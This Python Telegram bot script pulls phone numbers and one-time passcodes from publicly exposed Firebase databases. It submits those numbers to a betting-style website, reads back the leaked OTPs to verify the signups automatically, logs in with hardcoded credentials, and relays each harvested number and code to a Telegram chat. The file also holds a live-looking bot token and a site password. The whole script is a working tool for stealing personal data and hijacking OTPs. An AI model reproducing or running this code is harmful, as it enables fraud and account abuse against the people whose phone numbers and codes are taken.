import os
import asyncio
import requests
import json
import time
import random
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==== Telegram Config ====
TOKEN = "8681990378:AAFbGpzsTXc7dBsl02aQQxk7iqsR64kCRz8"
CHAT_ID = -1004480783091

# ==== Site Config ====
TARGET_URL = "https://cyberking-1.online/index.php"
USER_ID = "Brata king"   # <-- Change here
PASSWORD = "7391"  # <-- Change here
OPTIONS = ["789", "jackpot", "mbm", "bet"]

# ==== Firebase URLs (initially empty, add via Telegram) ====
FIREBASE_URLS = []  # Start empty, you add via /addurl

# ==== Global variables ====
running = False
processed = set()
bot = Bot(token=TOKEN)

def clean_phone(p):
    p = p.strip()
    if p.startswith("+91"): p = p[3:]
    elif p.startswith("91") and len(p)>10: p = p[2:]
    return ''.join(filter(str.isdigit, p))

def test_url(url):
    try:
        r = requests.get(url.rstrip('/')+'/.json', timeout=15)
        return r.status_code==200 and isinstance(r.json(), dict)
    except: return False

def get_numbers(url):
    global processed
    nums = []
    try:
        r = requests.get(url.rstrip('/')+'/.json', timeout=15)
        if r.status_code!=200: return []
        data = r.json()
        if not isinstance(data,dict): return []
        for k,v in data.items():
            if isinstance(v,dict) and 'phone' in v:
                raw = v['phone']
                clean = clean_phone(raw)
                if clean and clean not in processed:
                    processed.add(clean)
                    nums.append((k, clean, v.get('otp'), url))
        return nums
    except: return []

def submit_phone(phone):
    s = requests.Session()
    s.get(TARGET_URL)
    opts = random.sample(OPTIONS, 2)
    data = {"phone": phone, "submit": "1"}
    for o in opts:
        data.setdefault("game[]", []).append(o)
    r = s.post(TARGET_URL, data=data, timeout=10)
    if "otp" in r.text.lower():
        return s, opts
    return None, None

def verify_otp(otp, s):
    r = s.post(TARGET_URL, data={"otp": otp, "verify": "1"}, timeout=10)
    if "success" in r.text.lower() or "verified" in r.text.lower():
        return True
    return False

def login(s):
    r = s.post(TARGET_URL, data={"user": USER_ID, "pass": PASSWORD, "login": "1"}, timeout=10)
    if "dashboard" in r.text.lower() or "welcome" in r.text.lower():
        return True
    return False

async def auto_signup_loop():
    global running
    if not FIREBASE_URLS:
        await bot.send_message(chat_id=CHAT_ID, text="❌ No Firebase URLs added! Use /addurl <url>")
        running = False
        return
    active = [u for u in FIREBASE_URLS if test_url(u)]
    if not active:
        await bot.send_message(chat_id=CHAT_ID, text="❌ No accessible Firebase DB found!")
        running = False
        return
    await bot.send_message(chat_id=CHAT_ID, text=f"✅ Active URLs: {len(active)}\nStarting auto-signup...")
    while running:
        for url in active:
            for node, phone, otp, _ in get_numbers(url):
                if not running: return
                if phone:
                    session, opts = submit_phone(phone)
                    if session:
                        msg = f"[+] OTP sent to {phone} | options: {opts}"
                        print(msg)
                        await bot.send_message(chat_id=CHAT_ID, text=msg)
                        verified = False
                        for _ in range(30):
                            await asyncio.sleep(2)
                            if not running: return
                            new = get_numbers(url)
                            for n, p, o, _ in new:
                                if p == phone and o:
                                    if verify_otp(o, session):
                                        await bot.send_message(chat_id=CHAT_ID, text=f"[+] OTP verified: {o}")
                                        if login(session):
                                            await bot.send_message(chat_id=CHAT_ID, text=f"[+] Logged in as {USER_ID}")
                                        verified = True
                                    break
                            if verified:
                                break
        await asyncio.sleep(10)

# ==== Telegram Handlers ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_chat.id != CHAT_ID:
        return
    if running:
        await update.message.reply_text("Already running.")
        return
    running = True
    await update.message.reply_text("Starting auto-signup...")
    asyncio.create_task(auto_signup_loop())

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_chat.id != CHAT_ID:
        return
    running = False
    await update.message.reply_text("Stopped.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    await update.message.reply_text(f"Running: {running}\nActive URLs: {len(FIREBASE_URLS)}")

async def addurl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: /addurl <FirebaseURL>")
        return
    url = context.args[0].strip().rstrip('/')
    if not url.startswith("https://"):
        await update.message.reply_text("Invalid URL. Must start with https://")
        return
    if url in FIREBASE_URLS:
        await update.message.reply_text("Already added.")
        return
    # Test if accessible
    if test_url(url):
        FIREBASE_URLS.append(url)
        await update.message.reply_text(f"✅ Added: {url}\nActive now: {len(FIREBASE_URLS)}")
    else:
        await update.message.reply_text(f"❌ URL not accessible (403/404). Check URL and Firebase rules.")

async def listurls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    if not FIREBASE_URLS:
        await update.message.reply_text("No URLs added.")
    else:
        await update.message.reply_text("\n".join(FIREBASE_URLS))

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("addurl", addurl))
    app.add_handler(CommandHandler("listurls", listurls))
    app.run_polling()

if __name__ == "__main__":
    main()
    
